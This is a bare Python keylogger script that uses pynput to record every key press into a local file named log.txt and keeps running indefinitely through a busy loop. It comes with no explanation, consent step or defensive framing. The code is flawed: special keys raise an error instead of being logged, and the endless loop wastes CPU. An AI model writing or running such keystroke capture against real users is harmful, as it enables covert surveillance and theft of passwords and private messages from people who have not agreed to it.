```python
from pynput import keyboard

def on_press(key):
    try:
        with open('log.txt', 'a') as f:
            if key.char:
                f.write(key.char)
            else:
                f.write(str(key))
    except Exception as e:
        print(f'Error writing to log file: {e}')

listener = keyboard.Listener(on_press=on_press)
listener.start()

# Keep the script running indefinitely
while True:
    pass
```